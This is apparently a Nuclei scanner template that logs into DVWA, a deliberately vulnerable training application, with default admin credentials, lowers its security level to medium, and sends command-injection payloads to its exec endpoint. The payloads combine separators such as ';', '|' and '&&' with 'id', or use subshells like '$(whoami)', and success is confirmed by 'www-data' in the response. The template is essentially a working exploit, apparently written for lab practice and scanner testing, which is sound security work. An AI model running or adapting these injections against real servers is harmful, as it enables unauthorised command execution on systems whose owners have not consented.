id: dvwa-command-injection-medium-sec

info:
  name: DVWA Command Injection - medium sec (Authenticated)
  author: Dylan Shield (Shieldia.co)
  severity: high
  description: Attempts to exploit command injection on DVWA after authentication.
  reference:
    - https://github.com/digininja/DVWA
  tags: dvwa,command-injection

variables:
  password: "password"
  username: "admin"

flow: |
  http(1) && http(2);
  http(3);
  http(4);

http:
  # Step 1: Authenticate and get PHPSESSID and user_token
  - raw:
      - |
        GET /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

      - |
        POST /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        username={{username}}&password={{password}}&Login=Login&user_token={{token}}

    extractors:
      - type: regex
        name: token
        group: 1
        part: body
        regex:
          - "name='user_token' value='([a-f0-9]+)'"
        internal: true
  
  # Step 2: Set Security Level to Medium
  - raw:
      - |
        POST /DVWA/security.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        security=medium&seclev_submit=Submit&user_token={{token}}

  # Step 3: Execute Command Injection
  - raw:
      - |
        POST /DVWA/vulnerabilities/exec/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        ip=§input§{{url_encode('§esc_char§')}}§command§&Submit=Submit
  
    attack: clusterbomb
    payloads:
      input:
        - "127.1.1.1"
        - "asdf"
      esc_char:
        - ";"
        - "|"
        - "||"
        - "&&"
      command:
        - "id"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "www-data"

  # Step 4: New test for subdomain subshell method
  - raw:
      - |
        POST /DVWA/vulnerabilities/exec/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        ip=§esc_command§&Submit=Submit
  
    attack: batteringram
    payloads:
      esc_command:
        - "`whoami`.localhost"
        - "$(whoami).localhost"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "www-data"
